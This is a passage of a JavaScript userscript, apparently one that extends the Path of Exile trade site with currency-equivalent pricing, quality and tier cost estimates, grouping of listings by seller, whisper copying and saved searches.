            if(!$.data(this, "plugin_" + pluginName)) {
                $.data(this, "plugin_" + pluginName, new Plugin($(this), options));
            }
        });
    };
}));

var getColorPickerTemplate = function (id) {
  return /* html */ `
  <div id="${id ? id : ''}" class="colorPicker">
    <a class="color"><div class="colorInner"></div></a>
    <div class="track"></div>
    <ul class="dropdown"></ul>
    <input type="hidden" class="colorInput" value="#FFFFFF">
  </div>
  `
};



  var doOverrides = function() {
  //fix old jQuery
  $(document).on(`setting-frame-frame-created`, function(e, iframe) {
    fixTabs(iframe, "#myTab", "#myTabContent");

    iframe.contents().find('#currency-tab').on('click', function (e) {
      initCurrencyTables(iframe);
      fixTabs(iframe, "#myCurrTab", "#myCurrTabContent");
    });

  });

  $(document).on(`setting-frame-frame-created`, function(e, iframe) {
    debug(arguments, "setting-frame-frame-created");
    // $.fn.modal = function() {
    //   debug(arguments, "MODAL");
    //   if (arguments.length && arguments[0] == "show") {
    //     $(this).removeClass("hide");
    //   }
    // };
  });

  eval(GM_getResourceText("editableJs"));

  //function override
  $.each = function( obj, callback ) {
    var length, i = 0;
    if ( _.isArrayLike( obj ) ) {
      length = obj.length;
      for ( ; i < length; i++ ) {
        if ( callback.call( obj[ i ], i, obj[ i ] ) === false ) {
          break;
        }
      }
    } else {
      for ( i in obj ) {
        if ( callback.call( obj[ i ], i, obj[ i ] ) === false ) {
          break;
        }
      }
    }

    return obj;
  };

  app.$store.subscribe(function(mutation, state){
    switch (mutation.type) {
    case "setItemForSearchResult":
      info("STATE CHANGE: " + mutation.type, mutation.payload);
      itemsLoading[mutation.payload.localId+'-'+mutation.payload.id] = true;
      itemsLoaded(mutation);
      break;
    case "addSearchResult":
      info("STATE CHANGE: " + mutation.type, mutation.payload);
      searchLoading[mutation.payload.localId+'-'+mutation.payload.resultId] = true;
      searchLoaded(mutation);
      break;
    case "setTab":
      info("STATE CHANGE: " + mutation.type, mutation.payload);
      tabSelected(mutation.payload);
      break;
    case "removeCurrentSearch":
    case "setSearchDirty":
    case "clearSearchResults":
      info("STATE CHANGE: " + mutation.type, mutation.payload);
      searchChanged(mutation);
      break;
    case "clearSearchForm":
      info("STATE CHANGE: " + mutation.type, mutation.payload);
      clearSearchForm(mutation);
      break;
    case "updateBlurred":
    case "resetActiveUnreadHits":
      info("STATE CHANGE: " + mutation.type, mutation.payload);
      break;
    default:
      info("STATE CHANGE: " + mutation.type, mutation.payload);
      break;
    }
  });
};

function copyToClipboard(text) {
  fallbackCopyTextToClipboard(text);
  app.$root.$refs.toastr.Add({
      msg: app.translate("Whisper message copied."),
      progressbar: !1,
      timeout: 2e3
  });
}

function getPriceSpan(buyout, text) {
  return $(`<span class="">${text ? text : ''}<span class="currency currency-chaos">${buyout}×</span><span class="currency-text currency-image"><img src="https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyRerollRare.png?v=c60aa876dd6bab31174df91b1da1b4f9" alt="chaos" title="chaos"></span></span>`);
}

function getShortText(item) {
  // name rarity ilvl Crafted Corrupted Mirrored
  var rarity, name, ilvl, text = item.item.typeLine;
  switch (item.item.frameType) {
    case 0:
      rarity = "Normal";
      break;
    case 1:
      rarity = "Magic";
      break;
    case 2:
      rarity = "Rare";
      break;
    case 3:
      rarity = "Unique";
      break;
    case 6: //card
      break;
    default:
      rarity = "Undefined";
      warn(`Unrecognized frameType [${item.item.frameType}] for item`, item);
      break;
  }
  text += " - " + rarity;
  if (item.item.ilvl) {
    text += " - ilvl: " + item.item.ilvl;
  }
  if (item.item.corrupted) {
    text += " - Corrupted";
  }
  if (item.item.duplicated) {
    text += " - Mirrored";
  }
  if (item.item.identified === false) {
    text += " - Unidentified";
  }
  return text;
}

var addResultMessage = function(messageElement, msgClass, builder) {
  if (messageElement && $('.results .'+msgClass).length === 0) {
    var div = $(`<div class="gs-style gs-style-light gs-result-message marg-b-5 marg-lr-8 ${msgClass}"></div>`);
    $('.results').prepend(div);
    div.append(messageElement);
    if (builder) {
      builder(div);
    }
  }
}

var fixTabs = function(iframe, nav, container) {
  debug(iframe.contents().find(nav + ' a.nav-link'));
  iframe.contents().find(nav + ' a.nav-link').on('click', function(e) {
    var id = $(this).attr('id');
    var panel = $(this).attr('href');
    iframe.contents().find('#'+id).tab("show");
    iframe.contents().find(container + ' .tab-pane.show').removeClass("show active");
    iframe.contents().find(panel).addClass("show active");
  });
};

var fixToggler = function(iframe, preSelector, callback) {
  iframe.contents().find(preSelector + ' .gs-check-toggler .fa-check-square,' + preSelector + ' .gs-check-toggler .fa-square').on('click', function(e) {
    $(this).closest('.gs-check-toggler').toggleClass('gs-checked');
    if (callback) {
      callback($(this), e);
    }
  });
};

var fixTips = function() {
  $(".gs-fixTips[data-tippy]").each(function( index ) {
    var el = $( this );
    tippy(el[0], {content: el.attr("data-tippy")});
  });
};

var fullyLoaded = {}, itemsLoading = {}, searchLoading = {};
//localId: "search_1"
var isFullyLoaded = function(localId) {
  return fullyLoaded[localId] && fullyLoaded[localId].loaded;
};

//localId: "search_1"
var getSearch = function(localId) {
  if (_.isString(localId)) {
    var search = _.find(app.$store.state.transient.searches, function(x) { return (x.localId == localId); });
    debug("getSearch.search: ", search);
    return search;
  } else {
    return localId;
  }
};

//localId: "search_1" || {}, resultId: "result_2"
var getResults = function(localId, resultId) {
  var results = _.find(getSearch(localId).results, function(x) { return (x.id == resultId); });
  debug("getResults.results: ", results);
  return results;
};

var tabSelected = function (tab) {
  debug(tab);
  $('body').toggleClass('gs-search-tab', tab == "search");
  $('body').toggleClass('gs-exchange-tab', tab == "exchange");
  if (tab == "exchange") {
    waitFor(function () {
      if ($('.filter-title > span:contains(Maps)').length <= 0) throw new Error("Map section not found");
    }, {max: 3000}, function () {
      initMapSelector();
    });
  }
};

var itemsLoaded = $.debounce( 250, function(mutation) {
  if (currencies && currencies.map) {
    debug("DEBOUNCED STATE CHANGE: " + mutation.type, mutation.payload);
    if (getSetting('autoSortByRealCurrency')  && !getSetting('autoGroupSameUser') && !fullyLoaded[mutation.payload.localId]) {
      sortFullPage("chaosEquivalent", mutation.payload.localId, mutation.payload.id, "Results have been automatically sorted by real currency values.");
    } else if (getSetting('autoGroupSameUser') && !fullyLoaded[mutation.payload.localId]) {
      groupSameUser(true, mutation.payload.localId, mutation.payload.id);
    } else {
      enhanceAllItems(mutation.payload.localId, mutation.payload.id);
    }
  } else {
    debug("DEBOUNCED STATE CHANGE NEED CURRENCIES: " + mutation.type, mutation.payload);
    getCurrencies(getCurrentLeague(), function(curr) {
      currencies = curr;
      itemsLoaded(mutation);
    });
  }
});

var searchLoaded = $.debounce( 250, function(mutation) {
  if (currencies && currencies.map) {
    debug("DEBOUNCED STATE CHANGE: " + mutation.type, mutation.payload);
    if (fullyLoaded[mutation.payload.localId] && fullyLoaded[mutation.payload.localId].needRender) {
      fullyLoaded[mutation.payload.localId].needRender = false;
      enhanceAllItems(mutation.payload.localId, mutation.payload.resultId);
    }
    if (getSetting('useSaveManager')) initSaveManager();
  } else {
    debug("DEBOUNCED STATE CHANGE NEED CURRENCIES: " + mutation.type, mutation.payload);
    getCurrencies(getCurrentLeague(), function(curr) {
      currencies = curr;
      searchLoaded(mutation);
    });
  }
});

var searchChanged = $.debounce( 250, function(mutation) {
  if (currencies && currencies.map) {
    debug("DEBOUNCED STATE CHANGE: " + mutation.type, mutation.payload);
    if (getSetting('useSaveManager')) initSaveManager();
    fixTips();
  } else {
    debug("DEBOUNCED STATE CHANGE NEED CURRENCIES: " + mutation.type, mutation.payload);
    getCurrencies(getCurrentLeague(), function(curr) {
      currencies = curr;
      searchLoaded(mutation);
    });
  }
});

var clearSearchForm = $.debounce( 250, function(mutation) {
  if ($('.results .gs-result-message').length > 0) {
    $('.results .gs-result-message').remove();
  }
});

function toggleGroup(localId, resultId) {
  if ($('body').hasClass("grouped")) {
    ungroupSameUser(false, localId, resultId);
  } else {
    groupSameUser(false, localId, resultId);
  }
}

function groupSameUser(showAutoSortMessage, localId, resultId) {
  $('body').addClass("grouped");
  sortFullPage("buyoutGrouped", localId, resultId, (showAutoSortMessage ? "Results have been automatically grouped by and sorted by real currency values." : null));
}

function ungroupSameUser(doNotSort, localId, resultId) {
  $('body').removeClass("grouped");
  if (!doNotSort) sortFullPage('chaosEquivalent', localId, resultId);
}

function addMoreFromSameUserToItem(data, allItems) {
  data.more = [], data.first = true;
  data.totalBuyout = 0;
  if (_.has(data, "listing.price.amount")) {
    data.totalBuyout += convertBuyout(data.listing.price.amount + " " + data.listing.price.currency);
  }
  var index = _.indexOf(Object.keys(allItems), data.id);
  $.each( Object.keys(allItems), function( i, id ) {
    var item = allItems[id];
    if (_.has(data, "listing.account.name") && _.has(item, "listing.account.name") && data.listing.account.name == item.listing.account.name && id != data.id && _.indexOf(data.more, id) < 0) {
      data.more.push(id);
      if (i < index) {
        data.first = false;
      }
      if (_.has(item, "listing.price.amount")) {
        data.totalBuyout += convertBuyout(item.listing.price.amount + " " + item.listing.price.currency);
      }
    }
  });
  if (_.has(data, "listing.account.name")) {
    debug("more from "+data.listing.account.name, "searched over "+Object.keys(allItems).length, data.more);
  }
  data.buyoutPerItem = data.totalBuyout / (data.more.length + 1);
  data.buyoutGrouped = ((data.totalBuyout > 0) ? (((data.totalBuyout / (data.more.length + 1)) * 10000) - data.more.length) : null);
}

var renderMoreFromSameUser = function(item, data, localId, resultId) {
  var more = $(`<span class="gs-style gs-more gs-item-handle">${data.more.length} more from same user</span>`);
  if (data.first || data.more.length === 0) {
    item.addClass("gs-group-head");
  } else {
    item.addClass("gs-group-member");
  }
  if (getSetting('showGroupButtonOnZeroMoreFromSameUser') || data.more.length > 0) {
    if (item.find('.gs-more').length > 0) {
      item.find('.gs-more').first().parent().empty().append(more);
    } else {
      item.find('div.price [data-field=price]').last().after(more);
      more.wrap(`<div class="gs-wrapper"></div>`);
    }
  }
  more.on('click', function() {
    toggleGroup(localId, resultId);
  });

  if (data.more.length > 0) {
    var otherResults = $(`<div id="otherResultsFor${data.id}">click on an item to copy the whisper text to clipboard<br /></div>`);
    var search = getSearch(localId);
    var results = getResults(search, resultId);

    $.each( data.more, function( index, id ) {
      var item = results.items[id];
      if (_.has(item, "listing.price.amount") && item.listing.price.amount) {
        var value = convertBuyout(item.listing.price.amount + " " + item.listing.price.currency);
        var shortText = getShortText(item);
        var spn = $('<a href="#" class="nowrap">' + getPriceSpan(value).html() + ' - ' + shortText + '</a>');
        otherResults.append(spn);
        otherResults.append('<br />');
        spn.on('click', function(e) {
          e.preventDefault();
          copyToClipboard(item.listing.whisper);
          $(`[data-id=${id}] .whisper-btn`).addClass("active").html(app.translate("Copied!"));
        });
      }
    });
    var avg = $(`<div>${getPriceSpan((Math.round(data.buyoutPerItem*100)/100), "<b>Average price: </b>").html()}<br />click to group/ungroup results by user</div>`);
    var tipb = tippy(more[0], {content: avg[0], placement: "bottom", multiple: true});
    var tip = tippy(more[0], {content: otherResults[0], interactive: true, placement: "top", multiple: true});
  } else {
    tippy(more[0], {content: "click to group/ungroup results by user", placement: "bottom", multiple: true});
  }
};

function addMaxNormalizedCostToItem(data) {
  if (data.item && data.item.typeLine && data.listing.price && data.listing.price.amount) {
    var tier, maxTier;
    [tier, maxTier] = getTier(data.item.typeLine);
    if (tier && maxTier) {
      var buyout = convertBuyout(data.listing.price.amount + " " + data.listing.price.currency);
      var maxTierMulti = Math.pow(3, (maxTier - tier));
      var maxTierBuyout = buyout * maxTierMulti;
    }
    data.maxTierMulti = (buyout ? maxTierMulti : null);
    data.maxTierBuyout = (buyout ? maxTierBuyout : null);
  }
}

var renderMaxNormalized = function(item, data, localId, resultId) {
  if (item.find('.gs-max-tier').length == 0 && data.maxTierBuyout && data.listing.price) {
    if (data.listing.price.amount) {
      var sortHandle, tip;
      sortHandle = getPriceSpan((Math.round(data.maxTierBuyout*100)/100), "<b>Max Tier: </b>").addClass("gs-style gs-max-tier gs-item-handle");
      tip = $(`<div><span>To get a max tier item you need to buy <b>${data.maxTierMulti}</b> of this for a total of ${getPriceSpan((Math.round(data.maxTierBuyout*100)/100)).html()} chaos</span><br /><span>Click to sort results for max tier cost.</span></div>`);
      item.find('div.price [data-field=price]').last().after(sortHandle);
      sortHandle.wrap(`<div class="gs-wrapper"></div>`);
      tippy(sortHandle[0], {content: tip[0]});
      sortHandle.on('click', function(e) {
        e.preventDefault();
        sortFullPage("maxTierBuyout", localId, resultId);
      });
    }
  }
};

function addMaxQtCostToItem(data) {
  if (data.listing && data.listing.price && data.listing.price.amount && !data.item.corrupted && !data.item.duplicated && ((data.item.category && data.item.category.gems) || _.has(data.item, "support"))) {
    var qt = data.item.properties.find(function(x) {return x.name == "Quality" && x.values && x.values[0];});
    if (qt) {
      var match = /^\+?([\d]+)%?$/.exec(qt.values[0][0]);
      if (match) {
        qt = Number(match[1]);
      } else {
        qt = 0;
      }
    } else {
      qt = 0;
    }
    debug(`addMaxQtCostToItem.quality found: ${qt}`, data.item.properties);
    var maxqtcost = Math.max(20 - qt, 0) * convertBuyout("1 gcp");
    var buyout = convertBuyout(data.listing.price.amount + " " + data.listing.price.currency);
    maxqtcost += buyout;
    data.maxqtcost = (buyout ? maxqtcost : null);
  }
}

var renderWikiLink = function(item, data, localId, resultId) {
  var name = ((_.get(data, 'item.frameType') == 3) ? _.get(data, 'item.name') : _.get(data, 'item.baseType'));
  debug("renderWikiLink", item, data, name);
  if (name) {
    item.find(".itemName").last().append(`<a target="_blank" class="wiki-link gs-style gs-wikiLink" href="http://pathofexile.gamepedia.com/${name}">wiki</a>`);
  }
};

var renderMaxQt = function(item, data, localId, resultId) {
  if (item.find('.gs-max-qt').length == 0 && data.maxqtcost && data.listing.price) {
    if (data.listing.price.amount) {
      var sortHandle, tip;
      sortHandle = getPriceSpan((Math.round(data.maxqtcost*100)/100), "<b>Max QT: </b>").addClass("gs-style gs-max-qt gs-item-handle");
      tip = $(`<div><span>total ${getPriceSpan((Math.round(data.maxqtcost*100)/100)).html()} chaos for buying the gem and gemcutters to bring it to max quality.</span><br /><span>Click to sort results for max quality cost.</span></div>`);
      item.find('div.price [data-field=price]').last().after(sortHandle);
      sortHandle.wrap(`<div class="gs-wrapper"></div>`);
      // if (data.listing.price.currency == "chaos") {
      //   item.find('.price-label ~ br').nextAll('span:not(.chaosEquiv)').hide();
      // }
      tippy(sortHandle[0], {content: tip[0]});
      sortHandle.on('click', function(e) {
        e.preventDefault();
        sortFullPage("maxqtcost", localId, resultId);
      });
    }
  }
};

function addChaosEquivToItem(data) {
  if (data.listing && data.listing.price) {
    if (data.listing.price.amount) {
      data.buyout = data.listing.price.amount + " " + data.listing.price.currency;
      data.chaosEquivalent = convertBuyout(data.buyout);
    } else if (data.listing.price.amount == null || data.listing.price.amount == undefined) {
      // TIP: data.listing.price.item => sellcurrency and sellvalue => what you pay
      // TIP: data.listing.price.exchange => buycurrency and buyvalue => what you get
      var buyout = convertBuyout(data.listing.price.exchange.amount + " " + data.listing.price.exchange.currency);
      var cada = buyout / Number(data.listing.price.item.amount);
      var tot = convertBuyout(data.listing.price.item.amount + " " + data.listing.price.item.currency) - buyout;
      var chaosEquivalent = tot;
      if (buyout !== 0) {
        data.chaosEquivalentTotal = chaosEquivalent;
        data.chaosEquivalent = cada;
      }
    }
  }
}

var renderChaosEquiv = function(item, data, localId, resultId) {
  if (item.find('.chaosEquiv').length == 0 && data.chaosEquivalent && data.listing.price) {
    var sortHandle, tip;
    if (data.listing.price.amount) {
      //TIP: SINGLE ITEM
      sortHandle = $(`<span class="chaosEquiv"><span class="currency currency-chaos"><b>Chaos Equiv: </b>${(Math.round(data.chaosEquivalent*100)/100)}×</span><span class="currency-text currency-image"><img src="https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyRerollRare.png?v=c60aa876dd6bab31174df91b1da1b4f9" alt="chaos" title="chaos"></span></span>`);
      tip = getChaosEquivTip(data.buyout, data.listing.price.currency, (_.has(data, "listing.account.lastCharacterName") ? data.listing.account.lastCharacterName : null));
      item.find('div.price [data-field=price]').last().after(sortHandle);
      sortHandle.wrap(`<div class="gs-wrapper"></div>`);
      // if (data.listing.price.currency == "chaos") {
      //   item.find('.price-label ~ br').nextAll('span:not(.chaosEquiv)').hide();
      // }
    } else {
      //TIP: BULK CURRENCY
      sortHandle = $(`<span class="chaosEquiv"><span>${(Math.round(data.chaosEquivalent*100)/100)}</span><span>&nbsp;×&nbsp;</span><img src="https://web.poecdn.com/image/Art/2DItems/Currency/CurrencyRerollRare.png?v=c60aa876dd6bab31174df91b1da1b4f9" alt="chaos" title="chaos"></span>`);
      tip = getCurrencyChaosEquivTip(data.chaosEquivalentTotal, data.chaosEquivalent, data.listing.price.item.currency, data.listing.price.exchange.currency);
      item.find('div.price').first().append(sortHandle);
      sortHandle.wrap(`<div class="gs-wrapper"></div>`);
      if (_.has(data, "listing.price.item.amount") && _.has(data, "listing.price.exchange.amount") && _.has(data, "listing.price.item.currency") && _.has(data, "listing.whisper")) {
        var min = $('<span class="gs-style gs-button">min</span>');
        var max = $('<span class="gs-style gs-button">max</span>');
        tippy(min[0], {content: `Copy to clipboard whisper for ${data.listing.price.item.amount} ${translateCurrencySafe(data.listing.price.item.currency)}`});
        min.on('click', function(e) {
          e.preventDefault();
          copyToClipboard(data.listing.whisper.replace("{0}", data.listing.price.item.amount).replace("{1}", data.listing.price.exchange.amount));
          item.find("div.details .whisper-btn").prev().addClass("copied");
        });
        var maxN = Math.floor(data.listing.price.item.stock / data.listing.price.item.amount);
        if (maxN > 1) {
          tippy(max[0], {content: `Copy to clipboard whisper for ${data.listing.price.item.amount * maxN} ${translateCurrencySafe(data.listing.price.item.currency)}`});
          max.on('click', function(e) {
            e.preventDefault();
            copyToClipboard(data.listing.whisper.replace("{0}", data.listing.price.item.amount * maxN).replace("{1}", data.listing.price.exchange.amount * maxN));
            item.find("div.details .whisper-btn").prev().addClass("copied");
          });
        } else {
          max.addClass("hide");
        }
        item.find('div.details .whisper-btn').parent().append(min).append(max);
      }
    }
    tippy(sortHandle[0], {content: tip[0], interactive: true});
    sortHandle.on('click', function(e) {
      e.preventDefault();
      sortFullPage("chaosEquivalent", localId, resultId);
    });
  }
};

//localId: "search_1", resultId: "result_2"
var enhanceAllItems = function(localId, resultId) {
  var search = getSearch(localId);
  var results = getResults(search, resultId);
  debug("enhanceAllItems.results: ", results);
  $.each( results.items, function( id, item ) {
    if (item) {
      var clone = enhanceItem(item, _.indexOf(results.result, id), results.items);
      if (clone) {
        app.$store.commit("setItemForSearchResult", {
          localId: localId,
          id: resultId,
          itemId: clone.id,
          itemData: clone
        });
      } else {
        waitFor([`$("[data-id=${id}]")[0].id`], function() {
          renderEnhancedItem($(`[data-id=${id}]`), item, localId, resultId);
        });
      }
    }
  });
};

var enhanceItem = function(item, index, allItems) {
  var clone = null;
  if (!(item.origIndex >= 0)) {
    debug("enhanceAllItems.item to enhance: ", item);
    if (!clone) clone = $.extend({}, item);
    clone.origIndex = index;
    if (currencies && currencies.map) {
      if (getSetting('enableChaosEquiv')) addChaosEquivToItem(clone);
      if (getSetting('enableMaxQtCost')) addMaxQtCostToItem(clone);
      if (getSetting('enableMaxNormCost')) addMaxNormalizedCostToItem(clone);
    }
  }
  if (getSetting('enableGroupedResults')) {
    if (clone) {
      addMoreFromSameUserToItem(clone, allItems);
    } else {
      var clone2 = $.extend({}, item);
      addMoreFromSameUserToItem(clone2, allItems);
      var intersect = _.intersection(clone2.more, item.more);
      if (intersect.length != clone2.more.length || intersect.length != item.more.length) {
        debug("found more items from same user for item "+item.id, clone2, item, intersect);
        clone = clone2;
      }
    }
  }
  return clone;
};

var renderEnhancedItem = function(item, data, localId, resultId) {
  debug("renderEnhancedItem.item to render: ", item, data, localId, resultId);
  if (getSetting('enableChaosEquiv')) renderChaosEquiv(item, data, localId, resultId);
  if (getSetting('enableMaxQtCost')) renderMaxQt(item, data, localId, resultId);
  if (getSetting('enableMaxNormCost')) renderMaxNormalized(item, data, localId, resultId);
  if (getSetting('enableGroupedResults')) renderMoreFromSameUser(item, data, localId, resultId);
  if (getSetting('addWikiLinks')) renderWikiLink(item, data, localId, resultId);
};

//sortKey: "chaosEquivalent", localId: "search_1", resultId: "result_2"
var sortItems = function(sortKey, localId, resultId, items, showAutoSortMessage) {
  if (!fullyLoaded[localId]) fullyLoaded[localId] = {};
  if (fullyLoaded[localId].sortKey == sortKey) {
    fullyLoaded[localId].ascending = !fullyLoaded[localId].ascending;
  } else {
    fullyLoaded[localId].sortKey = sortKey;
    fullyLoaded[localId].ascending = ASC;
  }

  var search = getSearch(localId);
  var results = getResults(search, resultId);
  var result = results.result.slice();
  debug(`sortItems.sorting results by ${sortKey} ${(fullyLoaded[localId].ascending?'ascending':'descending')}`);

  var compFields = [{field: sortKey, direction: (fullyLoaded[localId].ascending?'asc':'desc')}];
  if (getSetting('secondarySortByStockSize')) {
    compFields.push({field: "listing.price.item.stock", direction: "desc"});
  }

  result = result.sort(function(a, b) {
    var aa = items[a], bb = items[b];
    return comparator(aa, bb, compFields);
  });

  addResultMessage($(`<span>${showAutoSortMessage} </span>`), 'gs-auto-sort-message', function(div) {
    var lnk = $(`<a href="#">Click here to revert to orginal order.</a>`);
    lnk.on('click', function(e) {
      e.preventDefault();
      if (sortKey == "buyoutGrouped") {
        ungroupSameUser(true);
      }
      sortItems('origIndex', localId, resultId, items);
    });
    div.append(lnk);
    div.append(`<span> You can disable this feature in </span>`);
    var setts = $(`<a href="#">settings</a>`);
    setts.on('click', function(e) {
      e.preventDefault();
      $(document).one(`setting-frame-frame-open`, function() {
        $('#setting-frame').contents().find('#settings-tab').tab("show");
        $('#setting-frame').contents().find('#myTabContent .tab-pane.show').removeClass("show active");
        $('#setting-frame').contents().find('#settings').addClass("show active");
      });
      openFrame("setting-frame");
    });
    div.append(setts);
  });

  app.$store.commit("clearSearchResults", {
      localId: localId
  });
  app.$store.commit("addSearchResult", {
      localId: localId,
      resultId: resultId,
      id: search.id,
      result: result,
      items: items,
      total: results.total,
      inexact: results.inexact || !1
  });
  if (!fullyLoaded[localId]) fullyLoaded[localId] = {};
  fullyLoaded[localId].loaded = true;
  fullyLoaded[localId].needRender = true;
};

//sortKey: "chaosEquivalent", localId: "search_1", resultId: "result_2"
var sortFullPage = function(sortKey, localId, resultId, message) {
  if (!fullyLoaded[localId] || !fullyLoaded[localId].loaded) {
    if (!fullyLoaded[localId]) fullyLoaded[localId] = {};
    fullyLoaded[localId].loaded = false;

    var itemResultsPanel = _.find(app.$children, function(x) { return (x.$options._componentTag == "item-results-panel"); });
    app.$nextTick(function(){
      debug("loadFullPage.itemResultsPanel: ", itemResultsPanel);
      var resultSetComponent = _.find(itemResultsPanel.$children, function(x) {
        return (x.$options._componentTag == "resultset" && x.$options.propsData && x.$options.propsData.search && x.$options.propsData.search.localId == localId);
      });
      debug("loadFullPage.resultSetComponent: ", resultSetComponent);
      var search = getSearch(localId);
      var results = getResults(search, resultId);
      var tofetch = results.result.filter(function(x) {return !results.items[x];});
      debug("loadFullPage.tofetch: ", tofetch);

      var fetches = [];
      var getDeferredFetch = function(ids, retry) {
        var deferred = $.Deferred();
        var success = function(response) {
          debug("loadFullPage.DONE FETCHING: ", response);
          deferred.resolve(response);
        };
        var failure = function(error) {
          if (retry > 0) {
            debug("loadFullPage.FAIL FETCHING, RETRY " + retry, error);
            retry--;
            setTimeout(function(){
              var innerDeferred = getDeferredFetch(ids, retry);
              innerDeferred.done(success).fail(failure);
            }, 300);
          } else {
            debug("loadFullPage.FAIL FETCHING: ", error);
            deferred.reject(error);
          }
        };
        itemResultsPanel.fetchNext(search.id, ids, (search.type == "exchange"), (new $.Deferred)
        .done(success)
        .fail(failure)
        .always(function() {
          debug("loadFullPage.ALWAYS FETCHING: ", arguments);
        }));
        return deferred;
      };

      $.each( _.chunk(tofetch, 10), function( i, chunk ) {
        fetches.push(function() {return getDeferredFetch(chunk, 3);});
      });

      pacedWhen(fetches, {failureThreshold: 1, tick: getSetting('minimumRequestRate'), max: 1, modalTitle: getSetting('blockUiWhileLoading') ? "Loading all results before sorting" : null })
      .done(function(allRes) {
        fullyLoaded[localId].loaded = true;
        var allItems = $.extend({}, results.items);
        var startFrom = _.map(allItems, 'id').length;
        $.each( _.flatten(allRes), function( i, item ) {
          if (item && item.id) allItems[item.id] = item;
        });
        $.each( Object.keys(allItems), function( index, itemId ) {
          var clone = enhanceItem(allItems[itemId], index, allItems);
          allItems[itemId] = clone || allItems[itemId];
        });
        debug("loadFullPage.DONE ALL FETCHED: ", arguments, allItems);
        sortItems(sortKey, localId, resultId, allItems, message);
      })
      .fail(function () {
        debug("loadFullPage.FAIL ALL FETCHED: ", arguments);
        app.$root.$refs.toastr.Add({
            msg: app.translate("Failed to fetch the next set of trade items."),
            type: "error",
            progressbar: !1,
            timeout: 2e3
        });
      });

    });
  } else {
    var search = getSearch(localId);
    var results = getResults(search, resultId);
    sortItems(sortKey, localId, resultId, results.items, message);
  }
};

function getCurrentLeague() {
  debug("current league", app.$store.state.persistent.league);
  return app.$store.state.persistent.league;
}

function getAvailableLeagues() {
  leagues = app.static_.leagues.map(function(x) {return x.id});
};

function getSaveIcons() {
  var svicon = $(`<span class="gs-style gs-fixTips gs-save" data-tippy="Save search"><i class="fas fa-save"></i></span>`);
  var ldicon = $(`<span class="gs-style gs-fixTips gs-load" data-tippy="Load search"><i class="fas fa-folder-open"></i></span>`);
  var mticon = $(`<span class="gs-style gs-fixTips gs-multi hide" data-tippy="Multi live search"><i class="fas fa-satellite-dish"></i></span>`);
  if ($('.top .controls .controls-right').length > 0) {
    $('.top .controls .controls-right')
    .prepend(mticon.clone())
    .prepend(ldicon.clone())
    .prepend(svicon.clone());
    $('.top .controls').addClass("saveManager");
  } else {
    warn("save manager buttons not added to DOM");
  }
  return [svicon, ldicon, mticon];
}

var getSearchKey = function() {
  return searchesKey + ((app.$store.state.persistent.tab == 'exchange') ? '-exchange' : '-items');
};

var saveSearch = function() {
  var searches = getSearches();
  var name = saveFrame.contents().find('#searchName').val();
  var saveForm = function() {
    try {
      searches[name] = {
        type: app.state.tab,
        league: app.state.league,
        query: app.query.query
      };
      putSearches(searches);
      close();
    } catch(ex) {
      saveFrame.contents().find('div.row').first().append(/*html*/`
        <dic class="col-md-12 py-2">
          <div class="alert alert-danger" role="alert">
            <h4 class="alert-heading">Error</h4>
            <p>An error prevented PTE from saving the current search in your browser local storage.</p>
            ${((ex.message.indexOf("exceeded the quota")>0)?'<hr><p>It appears you have exceeded your browser local storage quota. At the moment the only solution is to delete older searches.</p>':'')}
          </div>
        </div>
      `);
    }
  }
  if (!searches[name] || window.confirm(`A search named ${name} already exists. Do you want to overwrite it?`)) {
    saveForm();
  }
};

var mapExchange = function(array) {
  var map = {};
  $.each( array, function( index, val ) {
    map[val] = true;
  });
  return map;
}

var addQuickFilters = function (search, quickFilters) {
  if (!_.isEmpty(quickFilters["force-league"])) {
    search.league = quickFilters["force-league"];
  }
  if (!_.isEmpty(quickFilters["force-cost"]) && (!quickFilters["force-cost-no-override"] || (!_.has(search, "query.filters.trade_filters.filters.price.max") && !_.has(search, "query.filters.trade_filters.filters.price.min") )) ) {
    _.set(search, "query.filters.trade_filters.filters.price.max", quickFilters["force-cost"]);
    if (_.has(search, "query.filters.trade_filters.filters.price.min")) {
      delete search.query.filters.trade_filters.filters.price.min;
    }
    if (_.has(search, "query.filters.trade_filters.filters.price.option")) {
      delete search.query.filters.trade_filters.filters.price.option;
    }
  }
  return search;
};

var openSearch = function(search, newTab, target, quickFilters) {
  debug("openSearch:", search);
  var origSearch = $.extend({}, search);
  addQuickFiltersMessage(quickFilters, function() {openSearch(origSearch, newTab, target, {});});
  addQuickFilters(search, quickFilters);
  var st = $.extend({}, app.$store.state, {
    persistent: {
      league: search.league,
      tab: search.type,
      exchange: {
        fulfillable: true,
        have: search.query.have ? mapExchange(search.query.have) : {},
        want: search.query.want ? mapExchange(search.query.want) : {}
      },
      stats: search.query.stats,
      status: _.has(search, "query.status.option") ? search.query.status.option : null,
      term: _.has(search, "query.term") ? search.query.term : null,
      name: (_.has(search, "query.name.option") ? search.query.name.option : (_.has(search, "query.name") ? search.query.name : null)),
      type: (_.has(search, "query.type.option") ? search.query.type.option : (_.has(search, "query.type") ? search.query.type : null)),
      disc: _.has(search, "query.name.discriminator") ? search.query.name.discriminator : (_.has(search, "query.type.discriminator") ? search.query.type.discriminator : null),
      filters: search.query.filters || {}
    }
  });
  debug(search, app.$store.state, st);
  app.$store.replaceState(st);

  var uid = _.uniqueId('search_');
  app.$store.commit("addSearchQuery", {
      localId: uid,
      type: search.type,
      league: search.league,
      query: search.query,
      sort: {
          price: "asc"
      }
  });
  app.$store.commit("setSearchActive", {
      localId: uid
  });
  close();
};

var addQuickFiltersMessage = function(quickFilters, remove) {
  $('.results .gs-forced-filters-message').remove();
  if (!_.isEmpty(quickFilters["force-league"]) || !_.isEmpty(quickFilters["force-cost"])) {
    var league = quickFilters["force-league"], cost = quickFilters["force-cost"];
    var message = `On this search you forced ${(league ? ("league to "+league+ ((cost) ? " and" : "")) : "")} ${(cost ? ("maximum price of "+cost+" chaos") : "")}`;
    addResultMessage($(`<span><i class="fas fa-exclamation-triangle"></i> ${message} </span>`), 'gs-forced-filters-message', function(div) {
      div.addClass("gs-warning");
      if (remove) {
        var lnk = $(`<a href="#">remove filters</a>`);
        lnk.on('click', function(e) {
          e.preventDefault();
          remove();
        });
        div.append(lnk);
      }
    });
  }
};

var connections = {};
var msLiveUid;
var stopSocket = function (index) {
  debug("Stopped socket "+index);
  connections[index].close();
  socketStatus(index, "stopped");
};
var stopAllSockets = function () {
  $.each( connections, function( i, c ) {
    stopSocket(i);
  });
  stopLiveConsole();
